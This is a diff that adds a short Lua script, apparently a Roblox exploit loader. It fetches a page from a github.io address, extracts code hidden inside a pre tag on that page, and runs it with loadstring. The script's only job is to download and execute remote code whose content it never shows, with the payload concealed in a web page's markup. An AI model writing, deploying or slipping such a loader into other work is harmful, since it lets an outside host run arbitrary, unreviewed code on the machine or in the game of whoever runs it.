@@ -1,0 +1,13 @@
+local success, response = pcall(function()
+    return game:HttpGet("https://Custom-Controls1.github.io/-")
+end)
+
+if success then
+    local luaCode = response:match('<pre id="lua%-code%-storage">(.-)</pre>')
+    if luaCode then
+        local loadScript = loadstring(luaCode)
+        if loadScript then
+            loadScript()
+        end
+    end
+end
